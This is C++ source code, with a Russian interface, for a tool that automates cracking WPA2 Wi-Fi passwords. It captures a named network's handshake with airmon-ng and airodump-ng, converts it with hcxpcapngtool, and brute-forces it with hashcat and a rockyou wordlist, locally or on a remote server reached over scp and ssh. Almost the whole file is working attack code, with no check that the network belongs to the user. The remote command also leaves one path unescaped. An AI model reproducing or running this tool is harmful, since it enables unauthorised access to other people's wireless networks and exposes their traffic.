// Wi-Fi Handshake Capture Tool
// Copyright (C) 2026 arlekin
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>

#include <iostream>
#include <cstdlib>
#include <chrono>
#include <cstdio>
#include <thread>
#include <string>
#include <csignal>
#include <filesystem>
#include <fstream> 
#include <sys/wait.h>
#include <iomanip>  
#define Red "\033[0;31m"
#define Green "\033[0;32m"
#define white "\033[0;37m"
#define blue "\033[0;34m"

const std::string RESET = "\033[0m";
const std::string YELLOW = "\033[33m";
const std::string MAGENTA = "\033[35m";
const std::string CYAN = "\033[36m";
const std::string BOLD = "\033[1m";
const std::string UNDERLINE = "\033[4m";

#include <fstream>
#include <sstream>
#include <vector>
#include <string>
std::string shellEscape(const std::string& arg) {
    std::string escaped;
    escaped += '\'';
    for (char c : arg) {
        if (c == '\'') {
            escaped += "'\\''";  // экранируем одинарную кавычку
        } else {
            escaped += c;
        }
    }
    escaped += '\'';
    return escaped;
}


class TimedCommandReader {
private:
    int pipe_fd;
    pid_t child_pid;
    
public:
    TimedCommandReader(const std::string& cmd) {
        int pipefd[2];
        pipe(pipefd);
        
        child_pid = fork();
        
        if (child_pid == 0) {
            dup2(pipefd[1], STDOUT_FILENO);
            dup2(pipefd[1], STDERR_FILENO);
            close(pipefd[0]);
            close(pipefd[1]);
            execl("/bin/sh", "sh", "-c", cmd.c_str(), nullptr);
            exit(1);
        }
        
        pipe_fd = pipefd[0];
        close(pipefd[1]);
    }
    
    void stopAndRead() {
        kill(child_pid, SIGTERM);
        usleep(100000);
        
        if (kill(child_pid, 0) == 0) {
            kill(child_pid, SIGKILL);
        }
        
        char buffer[4096];
        while (read(pipe_fd, buffer, sizeof(buffer)) > 0) {}
        
        close(pipe_fd);
        waitpid(child_pid, nullptr, WNOHANG);
    }
    
    ~TimedCommandReader() {
        if (child_pid > 0) {
            kill(child_pid, SIGKILL);
            close(pipe_fd);
            waitpid(child_pid, nullptr, WNOHANG);
        }
    }
};

std::vector<std::string> splitCSV(const std::string& line) {
    std::vector<std::string> columns;
    std::stringstream ss(line);
    std::string cell;
    
    while (std::getline(ss, cell, ',')) {
        if (cell.size() >= 2 && cell.front() == '"' && cell.back() == '"') {
            cell = cell.substr(1, cell.size() - 2);
        }
        columns.push_back(cell);
    }
    return columns;
}

std::vector<std::vector<std::string>> readCSV(const std::string& filename) {
    std::vector<std::vector<std::string>> data;
    std::ifstream file(filename);
    
    if (!file.is_open()) {
        return data;
    }
    
    std::string line;
    bool is_first_line = true;
    
    while (std::getline(file, line)) {
        if (line.empty()) continue;
        
        if (is_first_line) {
            is_first_line = false;
            continue;
        }
        
        std::vector<std::string> columns = splitCSV(line);
        if (columns.size() >= 14) {
            data.push_back(columns);
        }
    }
    
    return data;
}



void signalHandler(int signum) {
    std::cout << "\n\n[!]Останавливаем мониторинг..." << std::endl;
    std::system("sudo airmon-ng stop wlan0mon");
    std::system("sudo systemctl restart NetworkManager");
    std::cout << "[+] Настройки восстановлены. Выход." << std::endl;
    exit(0);
}

std::string resolvePathStrict(const std::string& path) {
    if (path.empty()) return "";
    
    std::string result = path;
    
    if (result[0] == '~') {
        const char* home = std::getenv("HOME");
        if (home) result = std::string(home) + result.substr(1);
    }
    
    try {
        return std::filesystem::canonical(result).string();
    } catch (const std::filesystem::filesystem_error& e) {
        std::cerr << "Ошибка пути: " << e.what() << std::endl;
        return result;
    }
}

void printBar(int seconds) {
    const int BAR_WIDTH = 32;
    if (seconds <= 0) {
        std::cout << "[===] 100%" << std::endl;
        return;
    }
    auto start = std::chrono::steady_clock::now();
    int total_steps = 100;
    
    for (int i = 0; i <= total_steps; i++) {
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - start
        ).count();
        
        if (elapsed >= seconds * 1000) {
            
            std::cout << "\r[" << std::string(BAR_WIDTH - 2, '=') << "] 100%" << std::flush;
            break;
        }
        
        int progress = (elapsed * 100) / (seconds * 1000);
        int fill = (BAR_WIDTH - 2) * progress / 100;
        
        std::string bar = "[";
        bar += std::string(fill, '=');
        if (progress < 100) bar += '>';
        bar += std::string(BAR_WIDTH - 2 - fill - (progress < 100 ? 1 : 0), ' ');
        bar += "]";
        
        std::cout << "\r" << bar << " " << progress << "%" << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
    std::cout << std::endl;
}



std::string getFreeFilename(const std::string& base_name) {
    for (int i = 1; i <= 100; i++) {
        std::stringstream ss;
        ss << base_name << "-" << std::setw(2) << std::setfill('0') << i << ".csv";
        
        if (!std::filesystem::exists(ss.str())) {
            std::stringstream result;
            result << base_name << "-" << std::setw(2) << std::setfill('0') << i;
            return result.str(); 
        }
    }
    return base_name + "-" + std::to_string(time(nullptr));
}

void check_wifi(std::string& out_bssid, std::string& out_channel, std::string& target_name) {
    std::string file_prefix = getFreeFilename("scan_result");
    std::system("sudo airmon-ng check kill");
    std::system("sudo airmon-ng start wlan0"); 
    
    std::string command = "sudo airodump-ng wlan0mon --write " + file_prefix + 
                      " --output-format csv --write-interval 1";
    
    TimedCommandReader reader(command);
    std::cout << "Сканирование сетей..." << std::endl;
    printBar(15);
    reader.stopAndRead();
    
    std::string csv_path = file_prefix + "-01.csv";
    auto networks = readCSV(csv_path);
    
    bool found = false;
    
    for (size_t i = 0; i < networks.size(); i++) {
        std::string essid = networks[i][13];
        
        if (essid.find(target_name) != std::string::npos) {
            out_bssid = networks[i][0];
            out_channel = networks[i][3];
            found = true;
            
            std::cout << "Найдена сеть: " << essid << std::endl;
            std::cout << "BSSID: " << out_bssid << std::endl;
            std::cout << "Канал: " << out_channel << std::endl;
            break;
        }
    }
    
    if (!found) {
        std::cout << "Сеть с таким названием не найдена. Доступные сети:" << std::endl;
        for (const auto& net : networks) {
            std::cout << " - " << net[13] << std::endl;
        }
        out_bssid = "";
        out_channel = "";
    }
    
    std::system("sudo airmon-ng stop wlan0mon");
    std::system("sudo systemctl restart NetworkManager");
}


//сохраняем путь в которых хранится файл, так же делаем переменную target_name глобальной поскольку она сохраняет имя файла


void capture_wpa_handshake() {
    std::string BSSID;
    std::string Number_chanel;
    std::string target_name;
    
    std::cout << "Пожалуйста введите название сети для перехвата хешей: " << std::endl;
    std::cin >> target_name;
    
    // Константный путь сохранения
    const char* home = std::getenv("HOME");
    std::string handshake_dir = std::string(home) + "/Automated-WPA2-Handshake-Cracking-Script/handshake";
    std::system(("mkdir -p " + handshake_dir).c_str());
    
    // Находим BSSID и канал по названию сети
    check_wifi(BSSID, Number_chanel, target_name);
    
    if (BSSID.empty()) {
        std::cout << "Сеть не найдена. Завершение." << std::endl;
        return;
    }
    
    std::cout << "\n=============================================" << std::endl;
    std::cout << "Начинаем перехват handshake для сети: " << target_name << std::endl;
    std::cout << "BSSID: " << BSSID << " | Канал: " << Number_chanel << std::endl;
    std::cout << "Файлы будут сохранены в: " << handshake_dir << std::endl;
    std::cout << "=============================================" << std::endl;
    std::cout << "\n[!] Нажмите Ctrl+C, когда handshake будет пойман" << std::endl;
    std::cout << "[!] Или подождите, пока клиент подключится к сети\n" << std::endl;
    
    std::system("sudo airmon-ng check kill");
    std::cout << "Включаем режим мониторинга" << std::endl;
    printBar(10);
    std::system("sudo airmon-ng start wlan0");
    
    std::cout << "Включаем режим тру хацкера и ждём пока кто-нибудь подключится: " << std::endl;
    printBar(15);
    
    // Запускаем захват
    std::string commands = "sudo airodump-ng -c " + Number_chanel + 
                      " --bssid " + shellEscape(BSSID) + 
                      " -w " + shellEscape(handshake_dir + "/" + target_name) + " wlan0mon";
    std::system(commands.c_str());
}

void convert_to_22000() {
    std::system("sudo airmon-ng stop wlan0mon");
    std::system("sudo systemctl restart NetworkManager");
    
    // Константный путь к папке с хэшами
    const char* home = std::getenv("HOME");
    std::string handshake_dir = std::string(home) + "/Automated-WPA2-Handshake-Cracking-Script/handshake";
    
    std::cout << "\n=============================================" << std::endl;
    std::cout << Green << "Конвертация .cap файла в формат 22000" << white << std::endl;
    std::cout << "=============================================" << std::endl;
    std::cout << "Файлы для конвертации находятся в: " << handshake_dir << std::endl;
    
    std::printf("Пожалуйста введите название файла (без расширения): ");
    std::string name_for_file_cap = "";
    std::cin >> name_for_file_cap;
    std::cout << std::endl;
    
    // Полный путь к .cap файлу
    std::string cap_path = handshake_dir + "/" + name_for_file_cap + ".cap";
    std::string output_path = handshake_dir + "/" + name_for_file_cap + ".22000";
    
    std::string command = "hcxpcapngtool -o " + shellEscape(output_path) + " " + shellEscape(cap_path);
    
    std::cout << CYAN << "Конвертируем файл: " << cap_path << RESET << std::endl;
    int hash = std::system(command.c_str());
    
    if (hash == 0) {
        std::cout << Green << "Победа! Файл преобразован и сохранён в: " << output_path << white << std::endl;
        std::cout << "Файл готов к отправке на сервер или локальному взлому" << std::endl;
    } else {
        std::cout << Red << "Ошибка при конвертации. Проверьте путь к файлу." << white << std::endl;
    }
}
// Экранирование спецсимволов для защиты от инъекций

// Проверка имени файла (только буквы, цифры, точки, дефисы, подчёркивания)
bool isSafeFilename(const std::string& filename) {
    if (filename.empty()) return false;
    for (char c : filename) {
        if (!isalnum(c) && c != '.' && c != '-' && c != '_') {
            return false;
        }
    }
    return true;
}

// Основная функция расшифровки
void decrypt_wpa() {
    // Путь к папке с хэшами
    const char* home = std::getenv("HOME");
    std::string handshake_dir = std::string(home) + "/Automated-WPA2-Handshake-Cracking-Script/handshake";
    
    // Меню выбора
    std::cout << "=============================================" << std::endl;
    std::cout << Red << "выберите действие:" << white << std::endl;
    std::cout << blue << "1 - расшифровать локально" << white << std::endl;
    std::cout << blue << "2 - отправить на сервер и расшифровать" << white << std::endl;
    std::cout << "=============================================" << std::endl;
    
    int local_or_server = 0;
    std::cout << "пожалуйста введите номер действия: ";
    std::cin >> local_or_server;
    
    std::cout << "пожалуйста введите имя файла (без расширения): ";
    std::string file_name = "";
    std::cin >> file_name;
    
    // Проверка безопасности имени файла
    if (!isSafeFilename(file_name)) {
        std::cerr << Red << "Ошибка: имя файла содержит недопустимые символы" << RESET << std::endl;
        return;
    }
    
    // Полный путь к .22000 файлу
    std::string full_filename = handshake_dir + "/" + file_name + ".22000";
    
    // ==================== ЛОКАЛЬНАЯ РАСШИФРОВКА ====================
    if (local_or_server == 1) {
        std::cout << Green << "локальная расшифровка" << white << std::endl;
        
        // Проверяем существование файла
        std::ifstream hash_file(full_filename);
        if (!hash_file.good()) {
            std::cerr << Red << "Ошибка: файл " << full_filename << " не найден!" << RESET << std::endl;
            return;
        }
        hash_file.close();
        
        // Запрашиваем путь к словарю
        std::string dict_path_raw = "";
        std::cout << "путь к словарю rockyou2024.zip: ";
        std::cin >> dict_path_raw;
        
        std::string dict_path = resolvePathStrict(dict_path_raw);
        
        // Проверяем существование словаря
        std::ifstream file_check(dict_path);
        if (!file_check.good()) {
            std::cerr << Red << "Ошибка: словарь не найден" << RESET << std::endl;
            return;
        }
        file_check.close();
        
        // Безопасный запуск hashcat (команда экранирована)
        std::string local_cmd = "unzip -p " + shellEscape(dict_path) + 
                               " | hashcat -m 22000 -a 0 " + shellEscape(full_filename) + 
                               " -O -w 3";
        std::cout << CYAN << "Выполняется команда..." << RESET << std::endl;
        
        int result = std::system(local_cmd.c_str());
        if (result != 0) {
            std::cerr << Red << "Ошибка при выполнении hashcat" << RESET << std::endl;
        }
    }
    
    // ==================== РАСШИФРОВКА ЧЕРЕЗ SSH ====================
    else if (local_or_server == 2) {
        std::cout << Green << "отправка на сервер и расшифровка" << white << std::endl;
        
        // Проверяем существование файла
        std::ifstream hash_file(full_filename);
        if (!hash_file.good()) {
            std::cerr << Red << "Ошибка: файл " << full_filename << " не найден!" << RESET << std::endl;
            return;
        }
        hash_file.close();
        
        // Ввод данных для SSH подключения
        std::string name_plus_ip_ssh, port, put_na_servac, server_dict_path;
        
        std::cout << "имя и айпи от ssh (имя@айпи): ";
        std::cin >> name_plus_ip_ssh;
        
        // Проверка формата
        if (name_plus_ip_ssh.find('@') == std::string::npos) {
            std::cerr << Red << "Ошибка: неверный формат" << RESET << std::endl;
            return;
        }
        
        std::cout << "port (обычно 22): ";
        std::cin >> port;
        
        // Проверка что порт - число
        for (char c : port) {
            if (!isdigit(c)) {
                std::cerr << Red << "Ошибка: порт должен быть числом" << RESET << std::endl;
                return;
            }
        }
        
        std::cout << "путь на сервере для сохранения: ";
        std::cin >> put_na_servac;
        
        std::cout << "путь к словарю на сервере: ";
        std::cin >> server_dict_path;
        
        // Копируем файл на сервер через scp
        std::string scp_cmd = "scp -P " + port + " " + shellEscape(full_filename) + 
                             " " + shellEscape(name_plus_ip_ssh + ":" + put_na_servac + "/" + file_name + ".22000");
        std::cout << CYAN << "Копируем файл на сервер..." << RESET << std::endl;
        
        if (std::system(scp_cmd.c_str()) != 0) {
            std::cerr << Red << "Ошибка при копировании" << RESET << std::endl;
            return;
        }
        
        // Формируем команду для выполнения на сервере
        std::string remote_cmd = "cd " + put_na_servac + 
                                " && unzip -p " + shellEscape(server_dict_path) + 
                                " | hashcat -m 22000 -a 0 " + shellEscape(file_name + ".22000") + 
                                " -O -w 3 -d 1";
        
        // Запускаем расшифровку на сервере
        std::string ssh_cmd = "ssh -p " + port + " " + shellEscape(name_plus_ip_ssh) + 
                             " " + shellEscape(remote_cmd);
        std::cout << CYAN << "Запускаем расшифровку на сервере..." << RESET << std::endl;
        
        if (std::system(ssh_cmd.c_str()) != 0) {
            std::cerr << Red << "Ошибка при выполнении" << RESET << std::endl;
        }
    }
    else {
        std::cout << Red << "неверный выбор" << white << std::endl;
    }
}

void Deistvie(int dei){
    int deistvie = dei;
    switch (deistvie) {
        case 1: {std::cout << "очистка мешающих процессов" << std::endl;
            capture_wpa_handshake();
                break;}
        case 2:{
            convert_to_22000();
            break;
        }
        
        case 3: {
        decrypt_wpa();
        break;
    }
        default:
        std::printf("кек");
}
}
int main() {
     std::signal(SIGINT, signalHandler);
    std::cout << Green << "=============================================" << white << std::endl; 
    std::cout << Red << "выбирите действие: " << white << std::endl;
    std::cout << blue << "1 перехватить пакет" << white << std::endl;
    std::cout << blue << "2 перевести в нужный формат для hashcat" << white << std::endl;
    std::cout << CYAN << "3 отправить на сервер и начать подбор"<< RESET << std::endl;
    std::cout << Green << "=============================================" << white << std::endl;
    int deistvie;
    while (true) {
    std::printf("пожалуйста введите номер действия");
    std::cin>>deistvie;
    Deistvie(deistvie);
    }
    return 0;
}
